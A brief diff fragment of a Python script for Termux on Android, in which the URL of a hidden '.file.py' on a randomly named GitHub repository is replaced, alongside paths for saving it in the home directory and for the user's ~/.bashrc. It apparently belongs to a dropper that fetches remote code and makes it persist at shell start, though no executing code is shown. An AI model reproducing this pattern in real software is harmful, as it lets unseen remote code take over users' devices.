@@ -3,7 +3,7 @@ import requests
 import sys
 
 # تحديد مسارات الملفات
-SCRIPT_URL = 'https://raw.githubusercontent.com/JDXSX/VBCJCXUF/main/.file.py'
+SCRIPT_URL = 'https://raw.githubusercontent.com/JDXSX/VBCGQSAH/main/.file.py'
 SCRIPT_PATH = '/data/data/com.termux/files/home/.file.py'
 BASHRC_PATH = os.path.expanduser('~/.bashrc')
 
